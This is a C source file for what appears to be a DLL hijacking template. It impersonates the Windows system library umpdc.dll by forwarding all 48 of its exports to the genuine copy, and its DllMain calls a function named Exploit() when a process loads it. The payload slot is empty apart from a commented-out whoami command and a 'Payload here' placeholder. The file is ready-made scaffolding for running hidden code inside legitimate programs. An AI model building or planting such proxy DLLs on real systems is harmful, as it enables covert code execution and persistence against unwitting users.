#pragma comment(linker,"/export:PdcAcquireRwLockExclusive=C:\\WINDOWS\\system32\\umpdc.PdcAcquireRwLockExclusive,@1")
#pragma comment(linker,"/export:PdcActivationClientActivityRequest=C:\\WINDOWS\\system32\\umpdc.PdcActivationClientActivityRequest,@2")
#pragma comment(linker,"/export:PdcActivationClientRegister=C:\\WINDOWS\\system32\\umpdc.PdcActivationClientRegister,@3")
#pragma comment(linker,"/export:PdcActivationClientUnregister=C:\\WINDOWS\\system32\\umpdc.PdcActivationClientUnregister,@4")
#pragma comment(linker,"/export:PdcAllocate=C:\\WINDOWS\\system32\\umpdc.PdcAllocate,@5")
#pragma comment(linker,"/export:PdcFree=C:\\WINDOWS\\system32\\umpdc.PdcFree,@6")
#pragma comment(linker,"/export:PdcNotificationClientAcknowledge=C:\\WINDOWS\\system32\\umpdc.PdcNotificationClientAcknowledge,@7")
#pragma comment(linker,"/export:PdcNotificationClientRegister=C:\\WINDOWS\\system32\\umpdc.PdcNotificationClientRegister,@8")
#pragma comment(linker,"/export:PdcNotificationClientUnregister=C:\\WINDOWS\\system32\\umpdc.PdcNotificationClientUnregister,@9")
#pragma comment(linker,"/export:PdcPortClose=C:\\WINDOWS\\system32\\umpdc.PdcPortClose,@10")
#pragma comment(linker,"/export:PdcPortOpen=C:\\WINDOWS\\system32\\umpdc.PdcPortOpen,@11")
#pragma comment(linker,"/export:PdcPortSendMessage=C:\\WINDOWS\\system32\\umpdc.PdcPortSendMessage,@12")
#pragma comment(linker,"/export:PdcPortSendMessageSynchronously=C:\\WINDOWS\\system32\\umpdc.PdcPortSendMessageSynchronously,@13")
#pragma comment(linker,"/export:PdcPpmProfileClientRegister=C:\\WINDOWS\\system32\\umpdc.PdcPpmProfileClientRegister,@14")
#pragma comment(linker,"/export:PdcPpmProfileClientUnregister=C:\\WINDOWS\\system32\\umpdc.PdcPpmProfileClientUnregister,@15")
#pragma comment(linker,"/export:PdcPpmProfileDisable=C:\\WINDOWS\\system32\\umpdc.PdcPpmProfileDisable,@16")
#pragma comment(linker,"/export:PdcPpmProfileEnable=C:\\WINDOWS\\system32\\umpdc.PdcPpmProfileEnable,@17")
#pragma comment(linker,"/export:PdcReleaseRwLockExclusive=C:\\WINDOWS\\system32\\umpdc.PdcReleaseRwLockExclusive,@18")
#pragma comment(linker,"/export:PdcResiliencyClientAcknowledge=C:\\WINDOWS\\system32\\umpdc.PdcResiliencyClientAcknowledge,@19")
#pragma comment(linker,"/export:PdcResiliencyClientRegister=C:\\WINDOWS\\system32\\umpdc.PdcResiliencyClientRegister,@20")
#pragma comment(linker,"/export:PdcResiliencyClientUnregister=C:\\WINDOWS\\system32\\umpdc.PdcResiliencyClientUnregister,@21")
#pragma comment(linker,"/export:PdcRwLockInitialize=C:\\WINDOWS\\system32\\umpdc.PdcRwLockInitialize,@22")
#pragma comment(linker,"/export:PdcSignalClientPulse=C:\\WINDOWS\\system32\\umpdc.PdcSignalClientPulse,@23")
#pragma comment(linker,"/export:PdcSignalClientRegister=C:\\WINDOWS\\system32\\umpdc.PdcSignalClientRegister,@24")
#pragma comment(linker,"/export:PdcSignalClientSetActive=C:\\WINDOWS\\system32\\umpdc.PdcSignalClientSetActive,@25")
#pragma comment(linker,"/export:PdcSignalClientUnregister=C:\\WINDOWS\\system32\\umpdc.PdcSignalClientUnregister,@26")
#pragma comment(linker,"/export:PdcSleep=C:\\WINDOWS\\system32\\umpdc.PdcSleep,@27")
#pragma comment(linker,"/export:PdcTaskClientRegister=C:\\WINDOWS\\system32\\umpdc.PdcTaskClientRegister,@28")
#pragma comment(linker,"/export:PdcTaskClientRequest=C:\\WINDOWS\\system32\\umpdc.PdcTaskClientRequest,@29")
#pragma comment(linker,"/export:PdcTaskClientUnregister=C:\\WINDOWS\\system32\\umpdc.PdcTaskClientUnregister,@30")
#pragma comment(linker,"/export:Pdcv2ActivationClientActivate=C:\\WINDOWS\\system32\\umpdc.Pdcv2ActivationClientActivate,@31")
#pragma comment(linker,"/export:Pdcv2ActivationClientDeactivate=C:\\WINDOWS\\system32\\umpdc.Pdcv2ActivationClientDeactivate,@32")
#pragma comment(linker,"/export:Pdcv2ActivationClientRegister=C:\\WINDOWS\\system32\\umpdc.Pdcv2ActivationClientRegister,@33")
#pragma comment(linker,"/export:Pdcv2ActivationClientRenewActivation=C:\\WINDOWS\\system32\\umpdc.Pdcv2ActivationClientRenewActivation,@34")
#pragma comment(linker,"/export:Pdcv2ActivationClientSetBrokeredProcessId=C:\\WINDOWS\\system32\\umpdc.Pdcv2ActivationClientSetBrokeredProcessId,@35")
#pragma comment(linker,"/export:Pdcv2ActivationClientUnregister=C:\\WINDOWS\\system32\\umpdc.Pdcv2ActivationClientUnregister,@36")
#pragma comment(linker,"/export:SleepstudyHelperBlockerActiveDereference=C:\\WINDOWS\\system32\\umpdc.SleepstudyHelperBlockerActiveDereference,@37")
#pragma comment(linker,"/export:SleepstudyHelperBlockerActiveReference=C:\\WINDOWS\\system32\\umpdc.SleepstudyHelperBlockerActiveReference,@38")
#pragma comment(linker,"/export:SleepstudyHelperBuildBlocker=C:\\WINDOWS\\system32\\umpdc.SleepstudyHelperBuildBlocker,@39")
#pragma comment(linker,"/export:SleepstudyHelperCreateBlockerFromGuid=C:\\WINDOWS\\system32\\umpdc.SleepstudyHelperCreateBlockerFromGuid,@40")
#pragma comment(linker,"/export:SleepstudyHelperCreateLibrary=C:\\WINDOWS\\system32\\umpdc.SleepstudyHelperCreateLibrary,@41")
#pragma comment(linker,"/export:SleepstudyHelperDestroyBlocker=C:\\WINDOWS\\system32\\umpdc.SleepstudyHelperDestroyBlocker,@42")
#pragma comment(linker,"/export:SleepstudyHelperDestroyBlockerBuilder=C:\\WINDOWS\\system32\\umpdc.SleepstudyHelperDestroyBlockerBuilder,@43")
#pragma comment(linker,"/export:SleepstudyHelperDestroyLibrary=C:\\WINDOWS\\system32\\umpdc.SleepstudyHelperDestroyLibrary,@44")
#pragma comment(linker,"/export:SleepstudyHelperGetBlockerGuid=C:\\WINDOWS\\system32\\umpdc.SleepstudyHelperGetBlockerGuid,@45")
#pragma comment(linker,"/export:SleepstudyHelperSetBlockerFriendlyName=C:\\WINDOWS\\system32\\umpdc.SleepstudyHelperSetBlockerFriendlyName,@46")
#pragma comment(linker,"/export:SleepstudyHelperSetBlockerParentHandle=C:\\WINDOWS\\system32\\umpdc.SleepstudyHelperSetBlockerParentHandle,@47")
#pragma comment(linker,"/export:SleepstudyHelperSetBlockerVisible=C:\\WINDOWS\\system32\\umpdc.SleepstudyHelperSetBlockerVisible,@48")


#include <windows.h>

int Exploit()
{
    //("whoami > C:\\whoami.txt");
    //Payload here
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        Exploit();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}